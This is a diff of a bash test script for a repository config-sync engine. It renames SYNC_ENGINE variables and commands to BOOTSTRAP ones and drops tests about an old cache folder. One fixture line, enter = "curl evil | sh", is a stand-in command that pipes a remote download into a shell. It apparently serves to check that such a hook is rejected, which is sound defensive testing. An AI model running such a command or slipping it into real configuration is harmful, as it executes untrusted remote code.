@@ -3,12 +3,12 @@
 #MISE description="Test repo-sync against scratch values files"
 #MISE tools.gomplate="latest"
 
-# Runs `sync-engine repo --dry-run`, `sync-engine repo --check` and, for a case
-# that compares a written file, `sync-engine repo`, with the working tree's
+# Runs `bootstrap sync --dry-run`, `bootstrap check` and, for a case
+# that compares a written file, `bootstrap sync`, with the working tree's
 # repo/, sync-engine/ and tools/ (the forwarding file), against scratch values
 # files and scratch consumers,
 # and checks the exit code and message of each case. The forward cases source
-# the forwarding file and call `repo_sync`. SYNC_ENGINE_BIN, when set, is the engine to test
+# the forwarding file and call `repo_sync`. BOOTSTRAP_BIN, when set, is the engine to test
 # (an absolute path); else the task builds it once from the copy of
 # sync-engine/. Needs no
 # network when gomplate, jq and yq are installed:
@@ -37,7 +37,7 @@ source "${MISE_PROJECT_ROOT}/.config/mise/tasks/_scripts/helpers"
 
 # Each per-file line prints, so the cases compare the log format. A case of the
 # default output unsets the variable.
-export SYNC_ENGINE_VERBOSE=1
+export BOOTSTRAP_VERBOSE=1
 
 root=${MISE_PROJECT_ROOT}
 tmp=$(mktemp -d "${TMPDIR:-/tmp}/test-repo-sync.XXXXXX")
@@ -64,12 +64,12 @@ _git -C "$clone" init --quiet
 _git -C "$clone" add -A
 _git -C "$clone" commit --quiet --no-verify -m "test copy"
 
-# The engine: SYNC_ENGINE_BIN, else one build from the copy of sync-engine/.
-if [[ -n ${SYNC_ENGINE_BIN:-} ]]; then
-  bin=$SYNC_ENGINE_BIN
+# The engine: BOOTSTRAP_BIN, else one build from the copy of sync-engine/.
+if [[ -n ${BOOTSTRAP_BIN:-} ]]; then
+  bin=$BOOTSTRAP_BIN
 else
-  (cd "$root" && mise x -- go build -C "$clone/sync-engine" -buildvcs=false -o "$tmp/sync-engine" ./cmd/sync-engine)
-  bin="$tmp/sync-engine"
+  (cd "$root" && mise x -- go build -C "$clone/sync-engine" -buildvcs=false -o "$tmp/engine" ./cmd/bootstrap)
+  bin="$tmp/engine"
 fi
 
 # The consumer: a repository with a `main` branch.
@@ -101,8 +101,8 @@ case_dirs=()
 # A <message> (a fixed string) must also be in the output. If the case
 # passes, the function <check> examines its output.
 # `case_args` replaces the arguments of the engine for the case; a case with
-# `--check` in them runs without SYNC_ENGINE_CLONE. `CASE_SYNC_ENGINE_URL`, when
-# set, becomes SYNC_ENGINE_URL of the case. `CASE_LIB=forward` sources the
+# `--check` in them runs without BOOTSTRAP_CLONE. `CASE_BOOTSTRAP_URL`, when
+# set, becomes BOOTSTRAP_URL of the case. `CASE_LIB=forward` sources the
 # forwarding file at the old library path, with REPO_SYNC_CLONE only, and
 # calls `repo_sync`.
 # `CASE_CLONE=none` sets no clone variable.
@@ -138,8 +138,8 @@ case_body() {
   fi
   local args=${case_args:---dry-run}
   (
-    unset SYNC_ENGINE_URL SYNC_ENGINE_CLONE REPO_SYNC_CLONE
-    [[ -z ${CASE_SYNC_ENGINE_URL:-} ]] || export SYNC_ENGINE_URL=$CASE_SYNC_ENGINE_URL
+    unset BOOTSTRAP_URL BOOTSTRAP_CLONE REPO_SYNC_CLONE
+    [[ -z ${CASE_BOOTSTRAP_URL:-} ]] || export BOOTSTRAP_URL=$CASE_BOOTSTRAP_URL
     export REPO_SYNC_VALUES=$values MISE_PROJECT_ROOT=$consumer REPO_SYNC_NO_AUTOUPDATE=1
     if [[ -n ${CASE_CALL:-} ]]; then
       "$CASE_CALL"
@@ -156,10 +156,10 @@ case_body() {
       exit
     fi
     if [[ ${CASE_CLONE:-} != none && " $args " != *" --check "* ]]; then
-      export SYNC_ENGINE_CLONE=$clone
+      export BOOTSTRAP_CLONE=$clone
     fi
     # shellcheck disable=SC2086
-    "$bin" repo $args
+    "$bin" sync $args
   ) > "$log" 2>&1 || got=$?
   # After the dry run, so that its output stays plain for the greps.
   [[ -n $case_color ]] && export FORCE_COLOR=1
@@ -177,7 +177,7 @@ case_body() {
   printf '%s\n' "$((failures + 1))" > "$dir/failures"
 }
 
-# run_check: run_case with `sync-engine repo --check`.
+# run_check: run_case with `bootstrap check`.
 run_check() { case_args=--check run_case "$@"; }
 
 # Wait for the oldest case, print its output and add its failures. A case
@@ -753,7 +753,7 @@ run_check "--check, the rules of the clone are skipped" 0 'environments = [ "dev
 version = "1"
 [overrides.gitignore]
 remove = [ "/nope/" ]' '' "$check_valid"
-CASE_SYNC_ENGINE_URL="$tmp/no-such-repo" run_check "--check, no clone" 0 'environments = [ "dev" ]' '' \
+CASE_BOOTSTRAP_URL="$tmp/no-such-repo" run_check "--check, no clone" 0 'environments = [ "dev" ]' '' \
   "$check_valid" check_no_clone
 case_args='--check --dry-run' run_case "--check with --dry-run" 2 'environments = [ "dev" ]' '' \
   'usage: repo_sync [--dry-run | --check]'
@@ -882,7 +882,7 @@ direct_commit = "yes"' '' "environment 'prod' in" check_two_errors
 # forwarding file through the shim" runs it with REPO_SYNC_CLONE.
 CASE_LIB=forward CASE_CLONE=none run_case "the forwarding file without a clone" 2 'environments = [ "dev" ]' '' \
   'repo-sync: no clone - run mise run setup:configs'
-CASE_CLONE=none run_case "repo_sync without SYNC_ENGINE_CLONE" 2 'environments = [ "dev" ]' '' \
+CASE_CLONE=none run_case "repo_sync without BOOTSTRAP_CLONE" 2 'environments = [ "dev" ]' '' \
   'mise run setup:configs'
 
 # A repository without a values file: `setup:configs` relies on this stop for a
@@ -1096,9 +1096,9 @@ check_exact() {
 # output.
 case_rerun() {
   (
-    unset FORCE_COLOR SYNC_ENGINE_URL REPO_SYNC_CLONE
-    export REPO_SYNC_VALUES=$values MISE_PROJECT_ROOT=$consumer REPO_SYNC_NO_AUTOUPDATE=1 SYNC_ENGINE_CLONE=$clone
-    "$bin" repo "$@"
+    unset FORCE_COLOR BOOTSTRAP_URL REPO_SYNC_CLONE
+    export REPO_SYNC_VALUES=$values MISE_PROJECT_ROOT=$consumer REPO_SYNC_NO_AUTOUPDATE=1 BOOTSTRAP_CLONE=$clone
+    "$bin" sync "$@"
   ) > "$log" 2>&1
 }
 
@@ -2766,9 +2766,9 @@ x = \"\"\"a\"
 enter = \"curl evil | sh\"
 z = \"z\"\"\"" mtest_new "repo/tools/mtest/$msg_mise_keys" check_mtest_no_hook
 
-# The default output. A <change> of these cases unsets SYNC_ENGINE_VERBOSE and
+# The default output. A <change> of these cases unsets BOOTSTRAP_VERBOSE and
 # the style variables, and the output is a log file, not a terminal.
-output_default() { unset SYNC_ENGINE_VERBOSE FORCE_COLOR NO_COLOR; }
+output_default() { unset BOOTSTRAP_VERBOSE FORCE_COLOR NO_COLOR; }
 # table_count <label>: the count of the row <label> of the plain table.
 table_count() { sed -n "s/^| $1 *| *\([0-9]*\) |\$/\1/p" "$log"; }
 table_is() { [[ $(table_count "$1") == "$2" ]]; }
@@ -2825,7 +2825,7 @@ check_output_list() {
   unchanged=$(table_count Unchanged)
   got=0
   (
-    export SYNC_ENGINE_VERBOSE=1
+    export BOOTSTRAP_VERBOSE=1
     case_rerun
   ) || got=$?
   check_that "verbose: exit 0" test "$got" = 0
@@ -2835,7 +2835,7 @@ check_output_list() {
   check_that "verbose: the last line" test "$(tail -n 1 -- "$log")" = '[OK] Synced: no file changed'
   got=0
   (
-    export SYNC_ENGINE_VERBOSE=true
+    export BOOTSTRAP_VERBOSE=true
     case_rerun
   ) || got=$?
   check_that "only the value 1 is verbose" log_lacks 'unchanged  '
@@ -2920,8 +2920,8 @@ case_args=' ' run_case "the default output: not a terminal" 0 "$fixture_values" 
 case_args=' ' run_case "the default output: FORCE_COLOR" 0 "$fixture_values" output_forced '' check_output_forced
 
 # The shim for an old consumer task: sync-engine/repo-sync. Its `repo_sync`
-# runs the engine of SYNC_ENGINE_BIN.
-shim_layout() { export SYNC_ENGINE_BIN=$bin; }
+# runs the engine of BOOTSTRAP_BIN.
+shim_layout() { export BOOTSTRAP_BIN=$bin; }
 # The old task `setup/configs/sync` of a consumer, as bootstrap shipped it
 # before the engine. The old `setup:configs` runs it with the clone copy.
 shim_old_task() {
@@ -2943,12 +2943,12 @@ set -euo pipefail
 # shellcheck source=/dev/null
 source "${MISE_PROJECT_ROOT}/.config/mise/tasks/_scripts/helpers"
 
-if [[ -z ${SYNC_ENGINE_CLONE:-} ]]; then
-  print_error "SYNC_ENGINE_CLONE is not set - run mise run setup:configs, which clones bootstrap"
+if [[ -z ${BOOTSTRAP_CLONE:-} ]]; then
+  print_error "BOOTSTRAP_CLONE is not set - run mise run setup:configs, which clones bootstrap"
   exit 2
 fi
 # shellcheck source=/dev/null
-source "${SYNC_ENGINE_CLONE}/sync-engine/repo-sync"
+source "${BOOTSTRAP_CLONE}/sync-engine/repo-sync"
 
 print_header "Syncing the shared files from bootstrap ..."
 
@@ -2959,7 +2959,7 @@ else
 fi
 EOF
   chmod 755 "$tasks/setup/configs/sync"
-  SYNC_ENGINE_CLONE=$clone REPO_SYNC_CLONE=$clone usage_dry_run=true bash "$tasks/setup/configs/sync"
+  BOOTSTRAP_CLONE=$clone REPO_SYNC_CLONE=$clone usage_dry_run=true bash "$tasks/setup/configs/sync"
 }
 check_shim_old_task() {
   check_that "the old sync task through the shim: its header" log_has 'Syncing the shared files from bootstrap ...'
@@ -2970,23 +2970,23 @@ CASE_CALL=shim_old_task run_case "the old sync task through the shim" 0 'environ
 CASE_LIB=forward run_case "the forwarding file through the shim" 0 'environments = [ "dev" ]' shim_layout \
   'Dry run: '
 shim_call() {
-  export SYNC_ENGINE_CLONE=$clone
+  export BOOTSTRAP_CLONE=$clone
   # shellcheck source=/dev/null
   source "$clone/sync-engine/repo-sync"
   repo_sync --dry-run
 }
 shim_bad_version() {
   shim_layout
-  unset SYNC_ENGINE_BIN
+  unset BOOTSTRAP_BIN
   printf '%s\n' v1.2 > "$clone/sync-engine/VERSION"
 }
 CASE_CALL=shim_call run_case "the shim, a VERSION that is not MAJOR.MINOR.PATCH" 5 'environments = [ "dev" ]' \
   shim_bad_version "repo-sync: sync-engine/VERSION of the clone is not MAJOR.MINOR.PATCH ('v1.2') - nothing synced"
 shim_bin_missing() {
   shim_layout
-  export SYNC_ENGINE_BIN=$tmp/missing
+  export BOOTSTRAP_BIN=$tmp/missing
 }
-CASE_CALL=shim_call run_case "the shim, a SYNC_ENGINE_BIN that is not a file" 2 'environments = [ "dev" ]' \
+CASE_CALL=shim_call run_case "the shim, a BOOTSTRAP_BIN that is not a file" 2 'environments = [ "dev" ]' \
   shim_bin_missing 'is not an executable file - nothing synced'
 
 # The examples of repo/examples/. Each values file must pass a dry run in a
@@ -3015,24 +3015,24 @@ while ((${#case_pids[@]})); do
 done
 
 # The cache and the lock of setup:configs. A fake engine, through
-# SYNC_ENGINE_BIN, replaces `sync-engine repo`: it records the commit of the
+# BOOTSTRAP_BIN, replaces `bootstrap sync`: it records the commit of the
 # copy that it gets, when the copy is a clone outside the cache, the lock is
 # released and it runs in the folder of MISE_PROJECT_ROOT. It adds one line for
 # each call, with the folder below the root and the flag after the commit. A
 # fake `mise` records each call, because the task must not call mise with
-# SYNC_ENGINE_BIN set. The task is rendered with one submodule `sub`.
+# BOOTSTRAP_BIN set. The task is rendered with one submodule `sub`.
 task="$tmp/setup-configs"
 printf '{"members":["sub"],"member_types":{"sub":"submodule"},"member_folders":{"sub":"sub"},"sync_engine":"%s/sync-engine"}\n' "$root" > "$tmp/ctx.json"
 gomplate --left-delim '<%' --right-delim '%>' -c ".=$tmp/ctx.json" \
   -f "$root/repo/tools/repo-sync/.config/mise/tasks/setup/configs/_default.tmpl" -o "$task"
-cache="$tmp/cache/sync-engine"
+cache="$tmp/cache/bootstrap"
 mkdir -p -- "$tmp/bin"
-cat > "$tmp/bin/sync-engine" << 'EOF'
+cat > "$tmp/bin/bootstrap" << 'EOF'
 #!/usr/bin/env bash
-[[ ${1:-} == repo && $(pwd -P) == "$(cd -- "$MISE_PROJECT_ROOT" && pwd -P)" && -e $SYNC_ENGINE_CLONE/.git && $SYNC_ENGINE_CLONE != "$XDG_CACHE_HOME"/* && ! -e $XDG_CACHE_HOME/sync-engine/lock ]] || exit 1
+[[ ${1:-} == sync && $(pwd -P) == "$(cd -- "$MISE_PROJECT_ROOT" && pwd -P)" && -e $BOOTSTRAP_CLONE/.git && $BOOTSTRAP_CLONE != "$XDG_CACHE_HOME"/* && ! -e $XDG_CACHE_HOME/bootstrap/lock ]] || exit 1
 sub=${MISE_PROJECT_ROOT#"$SYNC_ROOT"}
 sub=${sub#/}
-printf '%s\n' "$(git -C "$SYNC_ENGINE_CLONE" rev-parse HEAD)${sub:+ $sub}${2:+ $2}" >> "$SYNC_OUT"
+printf '%s\n' "$(git -C "$BOOTSTRAP_CLONE" rev-parse HEAD)${sub:+ $sub}${2:+ $2}" >> "$SYNC_OUT"
 [[ -z ${SYNC_FAIL:-} || ${SYNC_FAIL_IN:-$sub} != "$sub" ]] || exit "$SYNC_FAIL"
 EOF
 cat > "$tmp/bin/mise" << 'EOF'
@@ -3040,7 +3040,7 @@ cat > "$tmp/bin/mise" << 'EOF'
 printf '%s\n' "mise $*" >> "$SYNC_OUT"
 exit 1
 EOF
-chmod +x "$tmp/bin/sync-engine" "$tmp/bin/mise"
+chmod +x "$tmp/bin/bootstrap" "$tmp/bin/mise"
 
 # A remote with one commit: file:// so that --depth applies.
 new_remote() {
@@ -3050,13 +3050,13 @@ new_remote() {
 new_remote "$tmp/remote"
 new_remote "$tmp/remote2"
 
-# CONFIGS_BIN sets SYNC_ENGINE_BIN of the run; `none` unsets it.
+# CONFIGS_BIN sets BOOTSTRAP_BIN of the run; `none` unsets it.
 run_configs() {
-  local bin_env=(SYNC_ENGINE_BIN="${CONFIGS_BIN:-$tmp/bin/sync-engine}")
-  [[ ${CONFIGS_BIN:-} != none ]] || bin_env=(-u SYNC_ENGINE_BIN)
+  local bin_env=(BOOTSTRAP_BIN="${CONFIGS_BIN:-$tmp/bin/bootstrap}")
+  [[ ${CONFIGS_BIN:-} != none ]] || bin_env=(-u BOOTSTRAP_BIN)
   rm -f -- "$tmp/synced"
-  env -u SYNC_ENGINE_CACHE "${bin_env[@]}" MISE_PROJECT_ROOT="${CONFIGS_ROOT:-$root}" PATH="$tmp/bin:$PATH" \
-    XDG_CACHE_HOME="${cache%/*}" SYNC_ENGINE_URL="$1" SYNC_OUT="$tmp/synced" SYNC_ROOT="${CONFIGS_ROOT:-$root}" \
+  env -u BOOTSTRAP_CACHE "${bin_env[@]}" MISE_PROJECT_ROOT="${CONFIGS_ROOT:-$root}" PATH="$tmp/bin:$PATH" \
+    XDG_CACHE_HOME="${cache%/*}" BOOTSTRAP_URL="$1" SYNC_OUT="$tmp/synced" SYNC_ROOT="${CONFIGS_ROOT:-$root}" \
     bash "$task" > "$log" 2>&1
 }
 
@@ -3184,7 +3184,7 @@ usage_dry_run=true usage_sub=true CONFIGS_ROOT=$members_root run_configs "file:/
 check_configs "setup:configs --dry-run --sub" 0 "$got" "$commit --dry-run"
 check_synced "setup:configs --dry-run --sub" "$commit --dry-run"$'\n'"$commit sub --dry-run"
 
-# The engine. Without SYNC_ENGINE_BIN, the task reads sync-engine/VERSION of the
+# The engine. Without BOOTSTRAP_BIN, the task reads sync-engine/VERSION of the
 # copy. A value that is not MAJOR.MINOR.PATCH stops it before any mise call.
 version_remote="$tmp/remote-version"
 new_remote "$version_remote"
@@ -3203,16 +3203,16 @@ grep -qF "sync-engine/VERSION of the clone is not MAJOR.MINOR.PATCH ('v1.2') - n
 
 got=0
 CONFIGS_BIN="$tmp/no-such-engine" run_configs "file://$tmp/remote" || got=$?
-check_configs "setup:configs, a SYNC_ENGINE_BIN that is not a file" 2 "$got"
-check_synced "setup:configs, a SYNC_ENGINE_BIN that is not a file" ''
-grep -qF "SYNC_ENGINE_BIN $tmp/no-such-engine is not an executable file - nothing synced" "$log" || {
-  print_error "setup:configs, a SYNC_ENGINE_BIN that is not a file: no error message"
+check_configs "setup:configs, a BOOTSTRAP_BIN that is not a file" 2 "$got"
+check_synced "setup:configs, a BOOTSTRAP_BIN that is not a file" ''
+grep -qF "BOOTSTRAP_BIN $tmp/no-such-engine is not an executable file - nothing synced" "$log" || {
+  print_error "setup:configs, a BOOTSTRAP_BIN that is not a file: no error message"
   failures=$((failures + 1))
 }
 
 # The rules of the shared cache. Each case has its own XDG_CACHE_HOME.
 new_cache() {
-  cache="$tmp/$1/sync-engine"
+  cache="$tmp/$1/bootstrap"
   mkdir -p -- "${cache%/*}"
 }
 
@@ -3255,32 +3255,6 @@ check_configs_log() {
   fi
 }
 
-name="setup:configs removes the old bootstrap cache"
-new_cache legacy-removed
-old="${cache%/*}/bootstrap"
-mkdir -p -- "$old"
-: > "$old/file"
-got=0
-run_configs "file://$tmp/remote" || got=$?
-check_configs "$name" 0 "$got" "$commit"
-check_paths "$name" -n "$old" -n "$old.lock"
-
-name="setup:configs keeps the old cache of a live old stub"
-new_cache legacy-live
-old="${cache%/*}/bootstrap"
-mkdir -p -- "$old" "$old.lock"
-: > "$old/file"
-sleep 60 &
-holder=$!
-printf '%s\n' "$holder" > "$old.lock/pid"
-got=0
-run_configs "file://$tmp/remote" || got=$?
-kill "$holder" 2> /dev/null || true
-wait "$holder" 2> /dev/null || true
-check_configs "$name" 0 "$got" "$commit"
-check_paths "$name" -e "$old/file" -e "$old.lock/pid"
-check_configs_log "$name" -l 'Waiting for another sync'
-
 name="setup:configs leaves the old Mac cache"
 new_cache legacy-mac
 old="${cache%/*}/macos-setup"
@@ -3290,15 +3264,6 @@ got=0
 run_configs "file://$tmp/remote" || got=$?
 check_configs "$name" 0 "$got" "$commit"
 check_paths "$name" -e "$old/generated.txt" -n "$cache/macos-generated.tsv"
-
-name="setup:configs releases the old lock on a failure"
-new_cache legacy-failure
-old="${cache%/*}/bootstrap"
-mkdir -p -- "$old"
-got=0
-run_configs "file://$tmp/no-such-repo" || got=$?
-check_configs "$name" 5 "$got"
-check_paths "$name" -n "$old.lock"
 
 name="setup:configs, a normalized origin is the same clone"
 new_cache normalized
@@ -3370,31 +3335,6 @@ check_configs "$name, the second run" 0 "$got" "$(git -C "$tmp/remote3" rev-pars
 check_configs_log "$name" -h 'Updating the clone'
 check_configs_log "$name" -l 'Cloning into'
 
-# Each line of the old cache: the folder, and only its lock.
-name="setup:configs reports the old cache that it removes"
-new_cache legacy-line
-old="${cache%/*}/bootstrap"
-mkdir -p -- "$old"
-got=0
-run_configs "file://$tmp/remote" || got=$?
-check_configs "$name" 0 "$got"
-check_paths "$name" -n "$old"
-check_configs_log "$name" -h "Removed the old cache $old"
-
-name="setup:configs with only the old lock does not report a removal"
-new_cache legacy-lock-only
-old="${cache%/*}/bootstrap"
-mkdir -p -- "$old.lock"
-sleep 0 &
-holder=$!
-wait "$holder" 2> /dev/null || true
-printf '%s\n' "$holder" > "$old.lock/pid"
-got=0
-run_configs "file://$tmp/remote" || got=$?
-check_configs "$name" 0 "$got"
-check_paths "$name" -n "$old.lock"
-check_configs_log "$name" -l 'Removed the old cache'
-
 # The gate code:lint:repo-sync. It finds gomplate with `mise x`, so it starts in
 # this repository, and then it does a cd to its own MISE_PROJECT_ROOT.
 lint_task="$root/repo/tools/repo-sync/.config/mise/tasks/code/lint/repo-sync"
@@ -3406,12 +3346,12 @@ cp -- "$root/.config/mise/tasks/_scripts/helpers" "$gate_root/.config/mise/tasks
 printf '%s\n' 'repo_name = "test"' 'repo_url = "https://example.com/test"' 'environments = [ "dev" ]' \
   > "$gate_root/.config/bootstrap.toml"
 
-# SYNC_ENGINE_BIN gives the engine to the shim of the cache.
+# BOOTSTRAP_BIN gives the engine to the shim of the cache.
 run_gate() {
   (
     cd -- "$root"
-    env -u usage_files -u REPO_SYNC_VALUES MISE_PROJECT_ROOT="$gate_root" SYNC_ENGINE_CACHE="$gate_cache" \
-      SYNC_ENGINE_BIN="$bin" bash "$lint_task"
+    env -u usage_files -u REPO_SYNC_VALUES MISE_PROJECT_ROOT="$gate_root" BOOTSTRAP_CACHE="$gate_cache" \
+      BOOTSTRAP_BIN="$bin" bash "$lint_task"
   ) > "$log" 2>&1
 }
 
